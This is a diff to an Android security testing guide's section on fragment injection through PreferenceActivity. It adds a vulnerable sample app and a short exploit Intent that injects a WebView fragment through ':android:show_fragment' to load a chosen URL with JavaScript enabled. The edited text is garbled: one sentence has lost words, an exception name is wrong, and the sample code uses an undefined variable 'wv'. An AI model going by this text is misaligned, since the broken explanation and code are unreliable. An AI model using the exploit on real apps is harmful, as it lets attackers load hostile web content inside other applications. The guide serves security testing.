@@ -714,7 +714,8 @@ It is expected that the first field contains the `Fragment` class name and the s
 
 Due to the fact that the `PreferenceActivity` uses reflection to load the fragment, this can lead to load an arbitrary class inside the package or the Android SDK. The loaded class runs in the context of the application that exports this activity.
 
-With this vulnerability the attacker will be able to call non exported Activities or fragments inside the target application.
+With this vulnerability the attacker will be able fragments inside the target application.
+Any class that does not extends Fragment will cause a java.lang.CastException
 
 To mitigate this vulnerability, a new method called `isValidFragment` was added in Android 4.4 KitKat (API Level 19), that allows developers to override it and define which fragments are allowed to be used in this context.
 
@@ -748,12 +749,42 @@ return "com.fullpackage.MyPreferenceFragment".equals(fragmentName);
 
 ```
 
+#### Example of Vulnerable App and Exploitation
 
+MainActivity.class
+```Java
+public class MainActivity extends PreferenceActivity {
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+    }
+}
+```
 
+MyFragment.class
+```Java
+public class MyFragment extends Fragment {
+    public void onCreate (Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+    }
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+        View v = inflater.inflate(R.layout.fragmentLayout, null);
+        WebView myWebView = (WebView) wv.findViewById(R.id.webview);
+        myWebView.getSettings().setJavaScriptEnabled(true);
+        myWebView.loadUrl(this.getActivity().getIntent().getDataString());
+        return v;
+    }
+}
+```
+To exploit this vulnerable Activity you can create an application with the following code:
 
-
-
-
+```Java
+Intent i = new Intent();
+i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
+i.setClassName("pt.claudio.insecurefragment","pt.claudio.insecurefragment.MainActivity");
+i.putExtra(":android:show_fragment","pt.claudio.insecurefragment.MyFragment");
+Intent intent = i.setData(Uri.parse("https://security.claudio.pt"));
+startActivity(i);
+```
 
 
 ### Testing Object Persistence
